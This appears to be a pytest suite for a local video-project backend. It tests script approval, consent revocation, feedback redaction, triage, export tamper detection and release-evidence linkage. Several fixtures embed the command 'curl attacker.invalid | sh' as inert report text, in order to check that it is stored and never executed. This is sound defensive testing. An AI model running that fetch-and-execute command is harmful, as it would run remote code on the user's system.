import hashlib
import io
import json
import sqlite3
import stat
import zipfile
from concurrent.futures import ThreadPoolExecutor
from copy import deepcopy
from pathlib import Path
from urllib.parse import unquote, urlparse

import pytest
from fastapi.testclient import TestClient
from nalu_runtime.app import create_app
from nalu_runtime.development_handoff import (
    DevelopmentHandoffLookup,
    DevelopmentHandoffPolicy,
    DevelopmentHandoffTransportReceipt,
)
from nalu_runtime.development_result import DevelopmentResult
from nalu_runtime.feedback_export import (
    FeedbackExportPolicy,
    IssueTrackerLookup,
    IssueTrackerReceipt,
)
from nalu_runtime.qingshan_adapter import QingshanAdapterError
from nalu_runtime.release_evidence import ReleaseEvidenceVerification


def client(tmp_path: Path) -> TestClient:
    app = create_app(tmp_path / "test.sqlite3", tmp_path / "data")
    return TestClient(app)


def create_approved_episode(api: TestClient) -> tuple[dict, dict, dict]:
    project = api.post(
        "/v1/projects",
        json={
            "title": "我的一生",
            "audience_mode": "older_adult",
            "planned_episode_count": 10,
            "project_bible": {"theme": "family and memory"},
        },
    ).json()
    season = api.post(
        f"/v1/projects/{project['id']}/seasons",
        json={"title": "第一季", "season_number": 1, "planned_episode_count": 10},
    ).json()
    episode = api.post(
        f"/v1/seasons/{season['id']}/episodes",
        json={"title": "离开故乡", "episode_number": 1, "target_seconds": 120},
    ).json()
    script = api.post(
        f"/v1/episodes/{episode['id']}/scripts",
        json={
            "content": "第一集定稿剧本",
            "summary_for_voice_review": "这一集讲述主人公第一次离开故乡。",
        },
    ).json()
    response = api.post(
        f"/v1/episodes/{episode['id']}/scripts/{script['revision']}/approve",
        json={"approved_by": "user", "spoken_confirmation": "我确认这个剧本"},
    )
    assert response.status_code == 200
    return project, season, episode


def test_project_season_episode_hierarchy(tmp_path: Path) -> None:
    api = client(tmp_path)
    project, season, episode = create_approved_episode(api)

    assert api.get("/v1/projects").json()[0]["id"] == project["id"]
    assert api.get(f"/v1/projects/{project['id']}/seasons").json()[0]["id"] == season["id"]
    stored = api.get(f"/v1/episodes/{episode['id']}").json()
    assert stored["status"] == "script_approved"
    assert stored["approved_script_revision"] == 1

    approvals = api.get(f"/v1/episodes/{episode['id']}/script-approvals").json()
    assert len(approvals) == 1
    assert approvals[0]["approved_by"] == "user"
    assert approvals[0]["spoken_confirmation"] == "我确认这个剧本"


def test_creative_format_routes_projects_without_faking_an_adapter(tmp_path: Path) -> None:
    api = client(tmp_path)
    animation = api.post(
        "/v1/projects",
        json={
            "title": "小海豚历险记",
            "creative_format": "animation_series",
            "production_pipeline": "qingshan-short-drama",
        },
    )
    assert animation.status_code == 201
    assert animation.json()["creative_format"] == "animation_series"

    commercial = api.post(
        "/v1/projects",
        json={
            "title": "护肤品广告",
            "creative_format": "commercial_campaign",
            "production_pipeline": "unassigned",
        },
    )
    assert commercial.status_code == 201
    assert commercial.json()["production_pipeline"] == "unassigned"
    commercial_id = commercial.json()["id"]
    season = api.post(
        f"/v1/projects/{commercial_id}/seasons",
        json={"title": "广告活动", "season_number": 1},
    ).json()
    episode = api.post(
        f"/v1/seasons/{season['id']}/episodes",
        json={"title": "30秒主片", "episode_number": 1},
    ).json()
    script = api.post(
        f"/v1/episodes/{episode['id']}/scripts",
        json={"content": "广告脚本", "summary_for_voice_review": "主片摘要"},
    ).json()
    assert (
        api.post(
            f"/v1/episodes/{episode['id']}/scripts/{script['revision']}/approve",
            json={"approved_by": "user"},
        ).status_code
        == 200
    )
    blocked = api.post(
        f"/v1/episodes/{episode['id']}/production-runs",
        json={"dry_run": True},
        headers={"Idempotency-Key": "no-adapter"},
    )
    assert blocked.status_code == 409
    assert "no approved production adapter" in blocked.text


def test_documentary_readiness_requires_confirmed_citable_sources(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects",
        json={
            "title": "父亲的远行",
            "creative_format": "documentary_series",
            "production_pipeline": "unassigned",
            "project_bible": {"documentary_mode": "archival_with_reenactment"},
        },
    ).json()
    empty = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    assert empty["can_plan_chapters"] is False
    assert empty["can_enter_production"] is False
    assert empty["generated_reenactment_label_required"] is True

    asset = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "station-1982.jpg",
            "kind": "source_document",
            "name": "1982 年火车站老照片",
        },
        content=b"local archive bytes",
        headers={"Content-Type": "image/jpeg"},
    ).json()
    unlinked = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    assert unlinked["evidence"][0]["confirmation_status"] == "unlinked"
    assert unlinked["draft_or_unlinked_source_count"] == 1

    card = api.post(
        f"/v1/projects/{project['id']}/memory-cards",
        json={
            "asset_id": asset["id"],
            "title": "第一次离开家乡",
            "description": "父亲在火车站准备南下工作。",
            "approximate_date": "1982 年秋天",
            "place": "杭州火车站",
            "story_relevance": "作为第一章的真实开场。",
            "allowed_use": "story_development",
        },
    ).json()
    draft = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    assert draft["evidence"][0]["confirmation_status"] == "draft"
    assert draft["can_plan_chapters"] is False

    confirmed = api.post(
        f"/v1/memory-cards/{card['id']}/confirm",
        json={
            "confirmed_by": "本人",
            "reviewed_revision": 1,
            "review_channel": "voice_and_visual",
            "spoken_confirmation": "我确认这份资料可以归档并用于故事规划",
        },
    )
    assert confirmed.status_code == 200
    ready = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    assert ready["confirmed_narrative_source_count"] == 1
    assert ready["evidence"][0]["narrative_authority"] is True
    assert ready["can_plan_chapters"] is True
    assert ready["can_enter_production"] is False
    assert any("adapter" in blocker for blocker in ready["blockers"])

    portrait = api.post(
        f"/v1/projects/{project['id']}/asset-imports",
        params={
            "filename": "father.jpg",
            "kind": "character_image",
            "name": "父亲照片",
            "subject_name": "父亲",
            "consent_granted": True,
            "consent_granted_by": "本人",
            "consent_statement": "同意用于本纪录片项目",
        },
        content=b"portrait bytes",
        headers={"Content-Type": "image/jpeg"},
    ).json()
    portrait_card = api.post(
        f"/v1/projects/{project['id']}/memory-cards",
        json={
            "asset_id": portrait["id"],
            "title": "父亲青年照",
            "allowed_use": "visual_generation",
        },
    ).json()
    assert (
        api.post(
            f"/v1/memory-cards/{portrait_card['id']}/confirm",
            json={
                "confirmed_by": "本人",
                "reviewed_revision": 1,
                "review_channel": "voice",
                "spoken_confirmation": "我确认这张记忆卡并归档",
            },
        ).status_code
        == 200
    )
    before_revocation = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    portrait_evidence = next(
        item for item in before_revocation["evidence"] if item["asset_id"] == portrait["id"]
    )
    assert portrait_evidence["visual_generation_authorized"] is True
    assert (
        api.post(
            f"/v1/assets/{portrait['id']}/consent-revocations",
            json={"requested_by": "本人", "reason": "不再允许生成画面"},
        ).status_code
        == 201
    )
    after_revocation = api.get(f"/v1/projects/{project['id']}/documentary-readiness").json()
    portrait_evidence = next(
        item for item in after_revocation["evidence"] if item["asset_id"] == portrait["id"]
    )
    assert portrait_evidence["visual_generation_authorized"] is False

    drama = api.post("/v1/projects", json={"title": "剧情短剧"}).json()
    wrong_format = api.get(f"/v1/projects/{drama['id']}/documentary-readiness")
    assert wrong_format.status_code == 409


def test_feedback_is_local_redacted_and_child_sharing_fails_closed(tmp_path: Path) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects",
        json={"title": "儿童动画", "audience_mode": "child"},
    ).json()
    local = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "usability",
            "message": "按钮看不清，我的邮箱是 child@example.com，密钥 sk-secret123456789",
            "source": "voice",
        },
    )
    assert local.status_code == 201
    assert local.json()["status"] == "local_only"
    assert local.json()["redaction_applied"] is True
    assert "child@example.com" not in local.json()["message"]
    assert "sk-secret" not in local.json()["message"]

    blocked = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "feature_request",
            "message": "我希望字再大一点",
            "share_authorized": True,
        },
    )
    assert blocked.status_code == 409
    shared = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "feature_request",
            "message": "我希望字再大一点",
            "share_authorized": True,
            "guardian_approval": True,
        },
    )
    assert shared.status_code == 201
    assert shared.json()["status"] == "ready_for_review"
    listed = api.get("/v1/feedback", params={"project_id": project["id"]}).json()
    assert [item["id"] for item in listed] == [local.json()["id"], shared.json()["id"]]

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert len(backup["payload"]["feedback_items"]) == 2
    deleted = api.request(
        "DELETE",
        f"/v1/projects/{project['id']}",
        json={
            "confirmation_title": "儿童动画",
            "requested_by": "local-user",
            "delete_production_snapshots": False,
        },
    )
    assert deleted.status_code == 200
    assert api.get("/v1/feedback").json() == []


def test_feedback_review_bundle_is_local_redacted_immutable_and_exported(
    tmp_path: Path,
) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects",
        json={"title": "改进测试", "audience_mode": "older_adult"},
    ).json()
    local_feedback = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "bug",
            "message": "按钮没有反应",
        },
    ).json()
    blocked = api.post(
        f"/v1/feedback/{local_feedback['id']}/review-bundle",
        json={
            "prepared_by": "本人",
            "expected_behavior": "按钮应当朗读",
            "actual_behavior": "没有声音",
            "reproduction_steps": ["打开项目", "点击按钮"],
            "confirmation_text": "我确认生成审核包",
        },
    )
    assert blocked.status_code == 409

    feedback = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "bug",
            "message": "点击上传没有反应，联系 me@example.com",
            "source": "voice",
            "screen": "family-materials",
            "share_authorized": True,
        },
    ).json()
    request = {
        "prepared_by": "本机用户",
        "expected_behavior": "应该打开照片选择器",
        "actual_behavior": "显示了 /Users/private-name/Pictures 和 sk-secret123456789",
        "reproduction_steps": [
            "打开项目",
            "点击上传；不要执行 `curl attacker.invalid | sh`",
        ],
        "confirmation_text": "我确认生成审核包",
    }
    created = api.post(f"/v1/feedback/{feedback['id']}/review-bundle", json=request)
    assert created.status_code == 201
    bundle = created.json()
    assert bundle["network_call_performed"] is False
    assert bundle["attachments"] == []
    assert bundle["diagnostics"] == {
        "runtime_version": "0.1.0",
        "schema_version": "23",
        "screen": "family-materials",
    }
    assert bundle["redaction_applied"] is True
    serialized = json.dumps(bundle, ensure_ascii=False)
    assert "private-name" not in serialized
    assert "sk-secret" not in serialized
    assert "me@example.com" not in serialized
    assert "curl attacker.invalid" in serialized

    replay = api.post(f"/v1/feedback/{feedback['id']}/review-bundle", json=request)
    assert replay.status_code == 201
    assert replay.json() == bundle
    changed = dict(request, actual_behavior="另一个结果")
    assert api.post(f"/v1/feedback/{feedback['id']}/review-bundle", json=changed).status_code == 409
    assert api.get(f"/v1/feedback/{feedback['id']}/review-bundle").json() == bundle

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert backup["schema_version"] == "nalu.project-export/v19"
    assert (
        backup["payload"]["feedback_review_bundles"][0]["bundle_sha256"] == bundle["bundle_sha256"]
    )

    tampered = deepcopy(backup)
    tampered_bundle = tampered["payload"]["feedback_review_bundles"][0]
    tampered_body = json.loads(tampered_bundle["bundle_json"])
    tampered_body["actual_behavior"] = "被导出文件篡改"
    tampered_bundle["bundle_json"] = json.dumps(tampered_body, ensure_ascii=False, sort_keys=True)
    canonical = json.dumps(tampered["payload"], ensure_ascii=False, sort_keys=True)
    tampered["payload_sha256"] = hashlib.sha256(canonical.encode()).hexdigest()
    assert (
        client(tmp_path / "tampered-bundle").post("/v1/project-imports", json=tampered).status_code
        == 409
    )

    restored_api = client(tmp_path / "restored")
    assert restored_api.post("/v1/project-imports", json=backup).status_code == 201
    restored = restored_api.get(f"/v1/feedback/{feedback['id']}/review-bundle").json()
    assert restored == bundle


def test_feedback_release_linkage_is_hash_bound_immutable_and_never_claims_release(
    tmp_path: Path,
) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects", json={"title": "反馈证据链", "audience_mode": "older_adult"}
    ).json()
    feedback = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "bug",
            "message": "朗读按钮没有反应",
            "share_authorized": True,
        },
    ).json()
    bundle = api.post(
        f"/v1/feedback/{feedback['id']}/review-bundle",
        json={
            "prepared_by": "本机用户",
            "expected_behavior": "按钮应当朗读",
            "actual_behavior": "没有声音",
            "reproduction_steps": ["打开项目", "点击朗读"],
            "confirmation_text": "我确认生成审核包",
        },
    ).json()
    commit_sha = "a" * 40
    artifact_sha = "b" * 64
    request = {
        "review_bundle_sha256": bundle["bundle_sha256"],
        "reviewed_change": {
            "repository_url": "https://github.com/example/nalu",
            "commit_sha": commit_sha,
            "review_url": "https://github.com/example/nalu/pull/42",
            "approved_by": "maintainer-a",
            "approved_at": "2026-09-01T01:00:00Z",
            "test_evidence_sha256": "c" * 64,
        },
        "ci": {
            "run_url": "https://github.com/example/nalu/actions/runs/42",
            "head_sha": commit_sha,
            "conclusion": "success",
            "artifact_sha256": artifact_sha,
            "completed_at": "2026-09-01T01:10:00Z",
        },
        "installed_release": {
            "version": "0.2.0",
            "build": 20,
            "product_commit": commit_sha,
            "artifact_sha256": artifact_sha,
            "provenance_sha256": "d" * 64,
            "developer_id_team_id": "AB12CD34EF",
            "notarization_submission_id": "12345678-1234-1234-1234-123456789abc",
            "code_signature_verified": True,
            "notarization_verified": True,
            "gatekeeper_accepted": True,
            "installed_at": "2026-09-01T01:20:00Z",
        },
        "rollback": {
            "previous_version": "0.1.0",
            "previous_build": 10,
            "evidence_sha256": "e" * 64,
            "project_data_preserved": True,
            "verified_at": "2026-09-01T01:30:00Z",
        },
    }
    endpoint = f"/v1/feedback/{feedback['id']}/release-linkage"
    assert api.post(endpoint, json=request).status_code == 409

    wrong_bundle = deepcopy(request)
    wrong_bundle["review_bundle_sha256"] = "f" * 64
    assert (
        api.post(endpoint, json=wrong_bundle, headers={"Idempotency-Key": "release-linkage-0001"})
        .status_code
        == 409
    )
    mismatched_commit = deepcopy(request)
    mismatched_commit["ci"]["head_sha"] = "f" * 40
    assert (
        api.post(
            endpoint,
            json=mismatched_commit,
            headers={"Idempotency-Key": "release-linkage-0001"},
        ).status_code
        == 409
    )
    unsafe_receipt = deepcopy(request)
    unsafe_receipt["installed_release"]["notarization_verified"] = False
    assert (
        api.post(
            endpoint,
            json=unsafe_receipt,
            headers={"Idempotency-Key": "release-linkage-0001"},
        ).status_code
        == 422
    )
    invalid_rollback = deepcopy(request)
    invalid_rollback["rollback"]["previous_build"] = 20
    assert (
        api.post(
            endpoint,
            json=invalid_rollback,
            headers={"Idempotency-Key": "release-linkage-0001"},
        ).status_code
        == 409
    )
    assert (
        api.post(
            endpoint,
            json=request,
            headers={"Idempotency-Key": "release-linkage-0001"},
        ).status_code
        == 409
    )

    development_result_body = {
        "schema_version": "nalu.feedback-development-result/v1",
        "feedback_id": feedback["id"],
        "handoff_request_sha256": "1" * 64,
        "handoff_response_sha256": "2" * 64,
        "remote_task_id": "dev-release-fixture",
        "repository_url": "https://github.com/example/nalu",
        "branch_name": "fix/read-aloud",
        "commit_sha": commit_sha,
        "review_url": "https://github.com/example/nalu/pull/42",
        "test_evidence_sha256": "c" * 64,
        "verification_evidence_sha256": "3" * 64,
        "verified_by": "test-fixture",
        "verified_at": "2026-09-01T00:50:00Z",
        "read_only_verification_performed": True,
        "report_text_treated_as_inert": True,
        "repository_checkout_performed": False,
        "tool_calls": [],
        "code_executed": False,
        "merge_performed": False,
        "signing_performed": False,
        "release_performed": False,
        "external_write_performed": False,
        "idempotency_key_sha256": "4" * 64,
        "confirmation_sha256": "5" * 64,
        "request_sha256": "6" * 64,
        "created_at": "2026-09-01T00:50:00Z",
    }
    development_result_json = json.dumps(
        development_result_body, ensure_ascii=False, sort_keys=True
    )
    development_result_sha256 = hashlib.sha256(
        development_result_json.encode()
    ).hexdigest()
    with api.app.state.repository.db.connect() as connection:
        connection.execute(
            "INSERT INTO feedback_development_results VALUES (?, ?, ?, ?, ?)",
            (
                feedback["id"],
                development_result_body["request_sha256"],
                development_result_json,
                development_result_sha256,
                development_result_body["created_at"],
            ),
        )

    headers = {"Idempotency-Key": "release-linkage-0001"}
    created = api.post(endpoint, json=request, headers=headers)
    assert created.status_code == 201
    linkage = created.json()
    assert linkage["status"] == "qa_evidence_linked"
    assert linkage["release_claimed"] is False
    assert linkage["network_call_performed"] is False
    assert linkage["development_result_sha256"] == development_result_sha256
    assert linkage["idempotency_key_sha256"] == hashlib.sha256(
        b"release-linkage-0001"
    ).hexdigest()
    assert "release-linkage-0001" not in json.dumps(linkage, sort_keys=True)
    assert api.get(endpoint).json() == linkage
    assert api.post(endpoint, json=request, headers=headers).json() == linkage
    changed = deepcopy(request)
    changed["rollback"]["evidence_sha256"] = "1" * 64
    assert api.post(endpoint, json=changed, headers=headers).status_code == 409
    assert (
        api.post(endpoint, json=request, headers={"Idempotency-Key": "release-linkage-0002"})
        .status_code
        == 409
    )
    current_feedback = api.get("/v1/feedback", params={"project_id": project["id"]}).json()[0]
    assert current_feedback["status"] == "ready_for_review"

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert backup["schema_version"] == "nalu.project-export/v19"
    assert backup["payload"]["feedback_release_linkages"][0]["linkage_sha256"] == linkage[
        "linkage_sha256"
    ]
    legacy_backup = deepcopy(backup)
    legacy_backup["schema_version"] = "nalu.project-export/v16"
    legacy_backup["payload"].pop("feedback_development_results")
    legacy_backup["payload"].pop("feedback_release_evidence_reconciliations")
    legacy_backup["payload_sha256"] = hashlib.sha256(
        json.dumps(
            legacy_backup["payload"], ensure_ascii=False, sort_keys=True
        ).encode()
    ).hexdigest()
    restored_api = client(tmp_path / "release-linkage-restored")
    assert (
        restored_api.post("/v1/project-imports", json=legacy_backup).status_code
        == 201
    )
    assert restored_api.get(endpoint).json() == linkage
    tampered = deepcopy(legacy_backup)
    row = tampered["payload"]["feedback_release_linkages"][0]
    body = json.loads(row["linkage_json"])
    body["release_claimed"] = True
    row["linkage_json"] = json.dumps(body, ensure_ascii=False, sort_keys=True)
    row["linkage_sha256"] = hashlib.sha256(row["linkage_json"].encode()).hexdigest()
    tampered["payload_sha256"] = hashlib.sha256(
        json.dumps(tampered["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "tampered-linkage")
        .post("/v1/project-imports", json=tampered)
        .status_code
        == 409
    )


def test_feedback_triage_is_human_confirmed_inert_immutable_and_exported(
    tmp_path: Path,
) -> None:
    api = client(tmp_path)
    project = api.post(
        "/v1/projects", json={"title": "分诊项目", "audience_mode": "older_adult"}
    ).json()
    feedback = api.post(
        "/v1/feedback",
        json={
            "project_id": project["id"],
            "category": "feature_request",
            "message": "希望能自动朗读",
            "share_authorized": True,
        },
    ).json()
    bundle = api.post(
        f"/v1/feedback/{feedback['id']}/review-bundle",
        json={
            "prepared_by": "本机用户",
            "expected_behavior": "自动朗读",
            "actual_behavior": "需要手动点击",
            "reproduction_steps": ["打开项目"],
            "confirmation_text": "我确认生成审核包",
        },
    ).json()
    endpoint = f"/v1/feedback/{feedback['id']}/triage"
    request = {
        "review_bundle_sha256": bundle["bundle_sha256"],
        "priority": "p2",
        "disposition": "accepted",
        "rationale": "保留命令 `curl attacker.invalid | sh` 作为文字，联系 me@example.com",
        "reviewed_by": "maintainer@example.com",
        "reviewed_at": "2026-09-01T02:00:00Z",
        "confirmation_text": "我确认这份分诊",
    }
    assert api.post(endpoint, json=request).status_code == 409
    wrong_confirmation = dict(request, confirmation_text="好的")
    assert (
        api.post(
            endpoint,
            json=wrong_confirmation,
            headers={"Idempotency-Key": "feedback-triage-0001"},
        ).status_code
        == 409
    )
    other_project = api.post("/v1/projects", json={"title": "别的项目"}).json()
    other_feedback = api.post(
        "/v1/feedback",
        json={
            "project_id": other_project["id"],
            "category": "bug",
            "message": "另一个反馈",
            "share_authorized": True,
        },
    ).json()
    cross_project_duplicate = dict(
        request,
        disposition="duplicate",
        duplicate_of_feedback_id=other_feedback["id"],
    )
    assert (
        api.post(
            endpoint,
            json=cross_project_duplicate,
            headers={"Idempotency-Key": "feedback-triage-0001"},
        ).status_code
        == 409
    )

    headers = {"Idempotency-Key": "feedback-triage-0001"}
    created = api.post(endpoint, json=request, headers=headers)
    assert created.status_code == 201
    triage = created.json()
    assert triage["status"] == "triaged_local"
    assert triage["human_review_confirmed"] is True
    assert triage["tool_calls"] == []
    assert triage["code_change_performed"] is False
    assert triage["network_call_performed"] is False
    serialized = json.dumps(triage, ensure_ascii=False, sort_keys=True)
    assert "curl attacker.invalid" in serialized
    assert "me@example.com" not in serialized
    assert "maintainer@example.com" not in serialized
    assert "feedback-triage-0001" not in serialized
    assert "我确认这份分诊" not in serialized
    assert api.get(endpoint).json() == triage
    assert api.post(endpoint, json=request, headers=headers).json() == triage
    assert (
        api.post(endpoint, json=dict(request, priority="p1"), headers=headers).status_code == 409
    )
    current_feedback = api.get("/v1/feedback", params={"project_id": project["id"]}).json()[0]
    assert current_feedback["status"] == "ready_for_review"

    backup = api.get(f"/v1/projects/{project['id']}/export").json()
    assert backup["schema_version"] == "nalu.project-export/v19"
    assert backup["payload"]["feedback_triage_records"][0]["record_sha256"] == triage[
        "record_sha256"
    ]
    restored_api = client(tmp_path / "triage-restored")
    assert restored_api.post("/v1/project-imports", json=backup).status_code == 201
    assert restored_api.get(endpoint).json() == triage

    tampered = deepcopy(backup)
    row = tampered["payload"]["feedback_triage_records"][0]
    body = json.loads(row["record_json"])
    body["code_change_performed"] = True
    row["record_json"] = json.dumps(body, ensure_ascii=False, sort_keys=True)
    row["record_sha256"] = hashlib.sha256(row["record_json"].encode()).hexdigest()
    tampered["payload_sha256"] = hashlib.sha256(
        json.dumps(tampered["payload"], ensure_ascii=False, sort_keys=True).encode()
    ).hexdigest()
    assert (
        client(tmp_path / "triage-tampered")
        .post("/v1/project-imports", json=tampered)
        .status_code
        == 409
    )


def test_feedback_external_export_is_authorized_idempotent_and_ambiguity_safe(
    tmp_path: Path,
) -> None:
    class RecordingTransport:
        def __init__(self, fail: bool = False) -> None:
            self.fail = fail
            self.calls: list[dict] = []

        def create_issue(self, **kwargs) -> IssueTrackerReceipt:
            self.calls.append(kwargs)
            if self.fail:
                raise TimeoutError("unknown remote outcome")
            return IssueTrackerReceipt(
                remote_issue_id="42",
                remote_issue_url="https://github.com/example/nalu/issues/42",
                response={"number": 42, "state": "open", "access_token": "secret"},
            )

    class RecordingHandoffTransport:
        def __init__(self, fail: bool = False) -> None:
            self.fail = fail
            self.calls: list[dict] = []

        def submit_work_order(self, **kwargs) -> DevelopmentHandoffTransportReceipt:
            self.calls.append(kwargs)
            if self.fail:
                raise TimeoutError("unknown remote outcome")
            return DevelopmentHandoffTransportReceipt(
                remote_task_id="dev-42",
                remote_task_url="https://developer.example.test/tasks/dev-42",
                response={"task": "dev-42", "credential": "secret"},
            )

    class RecordingHandoffVerifier:
        def __init__(self) -> None:
            self.calls: list[dict] = []
            self.outcome = "found"

        def lookup_work_order(self, **kwargs) -> DevelopmentHandoffLookup:
            self.calls.append(kwargs)
            if self.outcome == "absent":
                return DevelopmentHandoffLookup(
                    outcome="absent",
                    receipt=None,
                    evidence={"source": "injected_read_only_fixture", "matched": False},
                )
            return DevelopmentHandoffLookup(
                outcome="found",
                receipt=DevelopmentHandoffTransportReceipt(
                    remote_task_id="dev-84",
                    remote_task_url="https://developer.example.test/tasks/dev-84",
                    response={"task": "dev-84", "state": "accepted"},
                ),
                evidence={"source": "injected_read_only_fixture", "matched": True},
            )

    class RecordingDevelopmentResultVerifier:
        def __init__(self) -> None:
            self.calls: list[dict] = []

        def lookup_result(self, **kwargs) -> DevelopmentResult:
            self.calls.append(kwargs)
            return DevelopmentResult(
                repository_url="https://github.com/example/nalu",
                branch_name="fix/upload-button",
                commit_sha="a" * 40,
                review_url="https://github.com/example/nalu/pull/42",
                test_evidence_sha256="b" * 64,
                evidence={
                    "source": "injected_read_only_fixture",
                    "review_state": "open",
                    "tests": "passed",
                },
            )

    class RecordingReleaseEvidenceVerifier:
        def __init__(self) -> None:
            self.calls: list[dict] = []
            self.artifact_sha256 = "c" * 64

        def lookup_release_evidence(self, **kwargs) -> ReleaseEvidenceVerification:
            self.calls.append(kwargs)
            return ReleaseEvidenceVerification(
                ci_run_url="https://github.com/example/nalu/actions/runs/42",
                ci_head_sha="a" * 40,
                ci_conclusion="success",
                artifact_sha256=self.artifact_sha256,
                ci_completed_at="2026-09-01T08:10:00Z",
                version="0.2.0",
                build=20,
                product_commit="a" * 40,
                provenance_sha256="d" * 64,
                developer_id_team_id="AB12CD34EF",
                notarization_submission_id="12345678-1234-1234-1234-123456789abc",
                code_signature_verified=True,
                notarization_verified=True,
                gatekeeper_accepted=True,
                installed_at="2026-09-01T08:20:00Z",
                previous_version="0.1.0",
                previous_build=10,
                rollback_evidence_sha256="e" * 64,
                project_data_preserved=True,
                rollback_verified_at="2026-09-01T08:30:00Z",
                evidence={"source": "injected_read_only_fixture", "matched": True},
            )

    policy = FeedbackExportPolicy(
        enabled=True,
        administrator_authorized=True,
        endpoint="https://issues.example.test/api/issues",
        repository="example/nalu",
    )
    transport = RecordingTransport()
    handoff_policy = DevelopmentHandoffPolicy(
        enabled=True,
        administrator_authorized=True,
        endpoint="https://developer.example.test/api/development-work-orders",
    )
    handoff_transport = RecordingHandoffTransport()
    handoff_verifier = RecordingHandoffVerifier()
    result_verifier = RecordingDevelopmentResultVerifier()
    release_evidence_verifier = RecordingReleaseEvidenceVerifier()
    app = create_app(
        tmp_path / "export.sqlite3",
        tmp_path / "export-data",
        feedback_export_policy=policy,
        issue_tracker_transport=transport,
        development_handoff_policy=handoff_policy,
        development_handoff_transport=handoff_transport,
        development_handoff_reconciliation_verifier=handoff_verifier,
        development_result_verifier=result_verifier,
        release_evidence_verifier=release_evidence_verifier,
    )
    api = TestClient(app)

    def reviewed_feedback(
        title: str, target_api: TestClient = api
    ) -> tuple[dict, dict, dict]:
        project = target_api.post("/v1/projects", json={"title": title}).json()
        feedback = target_api.post(
            "/v1/feedback",
            json={
                "project_id": project["id"],
                "category": "bug",
                "message": "按钮失败，联系 me@example.com",
                "share_authorized": True,
            },
        ).json()
        bundle = target_api.post(
            f"/v1/feedback/{feedback['id']}/review-bundle",
            json={
                "prepared_by": "本机用户",
                "expected_behavior": "按钮工作",
                "actual_behavior": "按钮失败",
                "reproduction_steps": ["点击按钮"],
                "confirmation_text": "我确认生成审核包",
            },
        ).json()
        triage = target_api.post(
            f"/v1/feedback/{feedback['id']}/triage",
            json={
                "review_bundle_sha256": bundle["bundle_sha256"],
                "priority": "p1",
                "disposition": "accepted",
                "rationale": "需要修复",
                "reviewed_by": "maintainer",
                "reviewed_at": "2026-09-01T03:00:00Z",
                "confirmation_text": "我确认这份分诊",
            },
            headers={"Idempotency-Key": f"triage-{feedback['id']}"},
        ).json()
        return project, feedback, triage

    project, feedback, triage = reviewed_feedback("外部导出")
    initial_readiness = api.get(
        f"/v1/feedback/{feedback['id']}/release-readiness"
    ).json()
    assert initial_readiness["ready_for_authorized_rollout"] is False
    assert initial_readiness["released"] is False
    assert initial_readiness["release_claimed"] is False
    bundle = api.get(f"/v1/feedback/{feedback['id']}/review-bundle").json()
    endpoint = f"/v1/feedback/{feedback['id']}/external-export"
    request = {
        "review_bundle_sha256": bundle["bundle_sha256"],
        "triage_record_sha256": triage["record_sha256"],
        "confirmation_text": "我确认导出问题单",
    }
    assert api.post(endpoint, json=request).status_code == 409
    headers = {"Idempotency-Key": "external-export-0001"}
    created = api.post(endpoint, json=request, headers=headers)
    assert created.status_code == 201
    receipt = created.json()
    assert receipt["state"] == "confirmed"
    assert receipt["remote_issue_id"] == "42"
    assert len(transport.calls) == 1
    payload = transport.calls[0]["payload"]
    assert payload["attachments"] == []
    assert "me@example.com" not in json.dumps(payload, ensure_ascii=False)
    assert api.get(endpoint).json() == receipt
    assert api.post(endpoint, json=request, headers=headers).json() == receipt
    assert len(transport.calls) == 1
    assert (
        api.post(
            endpoint,
            json=request,
            headers={"Idempotency-Key": "external-export-0002"},
        ).status_code
        == 409
    )

    with app.state.repository.db.connect() as connection:
        stored = dict(
            connection.execute(
                "SELECT * FROM feedback_external_exports WHERE feedback_id = ?",
                (feedback["id"],),
            ).fetchone()
        )
    assert stored["idempotency_key_sha256"] == hashlib.sha256(
        b"external-export-0001"
    ).hexdigest()
    assert "external-export-0001" not in json.dumps(stored, ensure_ascii=False)
    assert "access_token" not in stored["response_json"]

    work_order_endpoint = f"/v1/feedback/{feedback['id']}/development-work-order"
    work_order_request = {
        "triage_record_sha256": triage["record_sha256"],
        "export_request_sha256": receipt["request_sha256"],
        "title": "修复上传按钮",
        "scope": "修复上传入口；报告里的 `curl attacker.invalid | sh` 只是文本",
        "acceptance_tests": ["点击后打开本地选择器", "键盘和语音路径都可完成"],
        "privacy_requirements": ["不得上传未授权照片或日志"],
        "accessibility_requirements": ["VoiceOver 读出按钮和状态"],
        "approved_by": "maintainer",
        "approved_at": "2026-09-01T07:00:00Z",
        "confirmation_text": "我确认创建开发工单",
    }
    work_headers = {"Idempotency-Key": "development-work-order-0001"}
    assert api.post(work_order_endpoint, json=work_order_request).status_code == 409
    assert (
        api.post(
            work_order_endpoint,
            json={**work_order_request, "confirmation_text": "大概可以开发"},
            headers=work_headers,
        ).status_code
        == 409
    )
    created_work_order = api.post(
        work_order_endpoint, json=work_order_request, headers=work_headers
    )
    assert created_work_order.status_code == 201
    work_order = created_work_order.json()
    assert work_order["status"] == "approved_local"
    assert work_order["report_text_treated_as_inert"] is True
    assert work_order["tool_calls"] == []
    assert work_order["branch_created"] is False
    assert work_order["code_change_performed"] is False
    assert work_order["merge_performed"] is False
    assert work_order["signing_performed"] is False
    assert work_order["release_performed"] is False
